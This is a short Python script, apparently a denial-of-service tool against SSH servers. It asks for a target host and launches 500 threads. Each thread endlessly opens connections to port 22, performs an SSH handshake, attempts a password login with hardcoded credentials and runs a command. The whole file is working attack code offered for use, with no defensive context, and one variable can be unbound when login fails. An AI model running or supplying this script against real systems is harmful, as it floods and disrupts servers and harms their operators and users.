'''
PORT: 22
'''
import threading
import socket
from ssh2.session import Session

RHOST = input('RHOST: ')
RPORT = 22
acount = 0


def ssh_dos():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((RHOST,RPORT))
        
        try:
            session = Session()
            session.handshake(sock)
            session.userauth_password('user', 'toor')

            channel = session.open_session()
            channel.execute('ifconfig')
        except:
            pass
        
        global acount
        acount += 1
        print(acount)
            
        channel.close()

for i in range(500):
    print('starting new thread')
    thread = threading.Thread(target=ssh_dos)
    thread.start()

    
